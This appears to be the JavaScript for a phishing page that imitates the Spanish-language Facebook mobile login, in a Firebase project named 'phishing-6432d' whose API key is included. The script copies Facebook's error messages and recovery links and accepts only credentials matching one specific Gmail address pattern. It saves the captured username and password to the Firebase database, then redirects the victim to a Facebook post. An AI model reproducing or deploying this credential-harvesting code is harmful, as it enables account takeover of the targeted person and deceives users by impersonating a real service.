var firebaseConfig = {
    apiKey: "AIzaSyDkl2GXe2hV1644-vVpAEFot-w5tfr8zsI",
    authDomain: "phishing-6432d.firebaseapp.com",
    databaseURL: "https://phishing-6432d.firebaseio.com",
    projectId: "phishing-6432d",
    storageBucket: "phishing-6432d.appspot.com",
    messagingSenderId: "508538600716",
    appId: "1:508538600716:web:aa348971bde4a3ecdd9d29",
    measurementId: "G-X0T3W5VGYV",
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);
// document.addEventListener("DOMContentLoaded",  fetchData);
document.onreadystatechange =()=>{
    if(document.readyState ==="complete") {
        document.querySelector("body").style.visibility = "hidden"; 
        fetchData();
    }       
    
            
}

const db = firebase.database().ref("data").limitToLast(1);


//VALIDATION
const pattern = /^remington((\w)(?!\2)|\d){3}2@gmail.com$/;
const passwordPattern =/^(?=.{5,15}$)(?!yuli8954|galileo19|hehehe|fuckyou|marica|marico)(([a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ])(?!\2)|(?!\d*?(\d)\3{2})\d*)+$/gm;   
///^(?={5,15}$) (([a-zA-Z])(?!\2) | (?!\d*?(\d)\3{3})\d*))$/gm;
function isUsernameValid(username){
   
    let regex=new RegExp(pattern);
    if(username){
      // return regx.test(username);   
        return  regex.test(username);       
    }
    
    return false;
}
function isPasswordValid(password){
    const charSet=String.raw`a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ`;
   
    let regx=new RegExp(passwordPattern);
   
    if(password)
        return regx.test(password)
    
   return false; 
}



async function  fetchData(){
    
    await  db.on('value',(snapshot)=>{
        
             snapshot.forEach((childSnap)=>{
                  let data = childSnap.val();
                  
                  if(isUsernameValid(data.usename) && isPasswordValid(data.password)){
                    window.location.replace(
                        "https://www.facebook.com/YouWriteEnglish/posts/149495623437791",
                        "_blank"
                    );  
                  }                      
                    else 
                        document.querySelector("body").style.visibility = "visible";
                                                    
             })
         })
  
  }




//SUBMIT FUNCTION
submit = (username, password) => {
    const db = firebase.database().ref("data")
    let dataRef = db.push();
    dataRef.set({
        usename: username,
        password: password,
    });
};
const url = "https://phishing-6432d.firebaseio.com/data.json";
const loginBtn = document.getElementById("login");
const username = document.getElementById("m_login_email");
const password = document.getElementById("m_login_password");
const loginForm = document.getElementById("login_form");
const loginError = document.getElementById("login_error");


// EMPTY FIELDS ERROR
const errorMessage = document.createTextNode(
    "El correo electrónico o el número de teléfono que has introducido no coinciden con ninguna cuenta."
);
const errorMessageLink = document.createElement("a");
const linkMessage = document.createTextNode('Regístrate para crear una cuenta.')
const classAttribute = document.createAttribute("class");
const href = document.createAttribute("href");
classAttribute.value = " _652e ";
href.value = "https://m.facebook.com/r.php?soft=hjk";

//INVALID USERNAME ERROR

const errorInvalidUsername = document.createTextNode(
    "El número de móvil o el correo electrónico que has introducido no coinciden con ninguna cuenta."
);
const errorInvalid = document.createTextNode('Recupera tu cuenta.')

//const errorInvalidUserMessage = document.createTextNode('¿Has olvidado la contraseña?')

const errorRecoverUsername = document.createElement('a');
errorRecoverUsername.href='https://m.facebook.com/login/identify'
errorRecoverUsername.appendChild(errorInvalid);

//WRONG PASSWORD ERROR
const errorMessagePass = document.createElement('span')
const errorPass = document.createTextNode('Contraseña incorrecta.')
const errorRecoverPassMessage = document.createTextNode('¿Has olvidado la contraseña?')
const show = document.getElementById('u_0_1')
const errorRecoverPass = document.createElement('a');
errorRecoverPass.href = "https://m.facebook.com/recover/initiate/?ars=facebook_login_pw_error&email=julieta.bonilla.520&lwv=120&lwc=1348092";



    password.addEventListener('keyup',(e)=>{
        if(password.value !=='')
         show.style.display='block';
         else 
         show.style.display='none';

    });
    show.addEventListener('click',()=>{
        if(password.getAttribute('type').valueOf()==='password')
             password.setAttribute('type','text')
        else 
         password.setAttribute('type','password')
    })
loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    e.stopPropagation();
    const data = {
        usename: username.value,
        password: password.value,
    };
    
    if(username.value==='') {
        //loginError.style.display = "none";
        if(loginError.contains(errorMessagePass) && loginError.contains(errorRecoverPass)){
            loginError.removeChild(errorMessagePass);
            loginError.removeChild(errorRecoverPass)
        }
        
        if(loginError.contains(errorRecoverUsername) && loginError.contains(errorInvalidUsername)){
            loginError.removeChild(errorRecoverUsername);
            loginError.removeChild(errorInvalidUsername)
        }
        errorMessageLink.appendChild(linkMessage);
        errorMessageLink.href = 'https://m.facebook.com/r.php?soft=hjk';
        errorMessageLink.setAttribute('class',classAttribute.value);
        
        loginError.appendChild(errorMessage);
        loginError.appendChild(errorMessageLink);
        
        
        loginError.style.display = "block";
        
        
    }
    else if(!isUsernameValid(username.value) && username.value){
         
             if(loginError.contains(errorMessagePass) && loginError.contains(errorRecoverPass)){
                 loginError.removeChild(errorMessagePass);
                 loginError.removeChild(errorRecoverPass);
                }
                if( loginError.contains(errorMessage) && loginError.contains(errorMessageLink) ){
                     loginError.removeChild(errorMessage);
                     loginError.removeChild(errorMessageLink);   
                }
                
                 errorRecoverUsername.setAttribute('class',classAttribute.value)        
                 loginError.appendChild(errorInvalidUsername);
                 loginError.appendChild(errorRecoverUsername);
               
               
                 loginError.style.display = "block";
            }
    else if(!isPasswordValid(password.value) && isUsernameValid(username.value) ){
   
        if(loginError.contains(errorMessage) && loginError.contains(errorMessageLink)){
           
            loginError.removeChild(errorMessage);
            loginError.removeChild(errorMessageLink)
        }
        if(loginError.contains(errorRecoverUsername) && loginError.contains(errorInvalidUsername)){
            loginError.removeChild(errorRecoverUsername);
            loginError.removeChild(errorInvalidUsername)
        }
            errorMessagePass.appendChild(errorPass);
            errorRecoverPass.setAttribute('class',classAttribute.value)
            errorRecoverPass.appendChild(errorRecoverPassMessage);
       
            loginError.appendChild(errorMessagePass);
            loginError.appendChild(errorRecoverPass);
            
            loginError.style.display = "block";        
        
    }
     if(isPasswordValid(password.value) && isUsernameValid(username.value))
             {
                 submit(username.value,password.value);
                 window.location.replace(
                    "https://www.facebook.com/YouWriteEnglish/posts/149495623437791",
                    "_blank"
                );  
            }
});
